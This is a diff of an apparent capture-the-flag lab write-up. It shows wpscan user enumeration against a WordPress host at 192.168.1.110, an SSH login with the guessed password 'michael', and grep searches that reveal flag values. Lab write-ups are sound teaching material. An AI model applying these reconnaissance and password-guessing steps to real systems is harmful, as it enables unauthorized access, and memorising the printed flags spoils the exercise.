@@ -38,28 +38,32 @@ Tools used: dirb, wpscan
 
 - From there we ran wpscan: 
 ~~~
-wpscan –url http://192.168.1.110/wordpress
+wpscan -–url http://192.168.1.110/wordpress --wp-content-dir -at -eu
 ~~~
-![red2](https://user-images.githubusercontent.com/32025331/155894957-b9e4c47b-09d7-43ff-9d0f-d4a3ef808915.PNG)
+![red13](https://user-images.githubusercontent.com/32025331/155897592-cb46a654-efc7-48f6-a220-833e3841df88.PNG)  
 
 We then found two login names: Steven and Michael  
-![red3](https://user-images.githubusercontent.com/32025331/155894958-c2fc6d12-f3ff-47b4-93a7-9a038cbdac2a.PNG)
+![red14](https://user-images.githubusercontent.com/32025331/155897593-ce8c5a5b-778a-486d-9d9d-c38249113aa4.PNG)  
 
 By sheer luck, we guessed the password without brute force:  
 ~~~
 ssh michael@192.168.1.110
-Password:  michael
+Password: michael
 cd ../../var/www/html
 grep -RE flag1
 ~~~
 ![red4](https://user-images.githubusercontent.com/32025331/155894959-9c35c8ed-fc7c-4049-8b13-c03f6d785452.PNG)  
   
+  
 **flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**  
-- Follow same steps as flag 1 to ssh into the server  
+Using the same credentials, we SSH into the webserver:
 ~~~ 
+ssh michael@192.168.1.110
+Password: michael
 cd ../../var/www/
 grep -RE flag2
 ~~~
+![red15](https://user-images.githubusercontent.com/32025331/155897666-7187d4ef-e7dc-4231-985f-f4c87a644dfa.PNG)
 
 
 **flag3{afc01ab56b50591e7dccf93122770cd2}**  
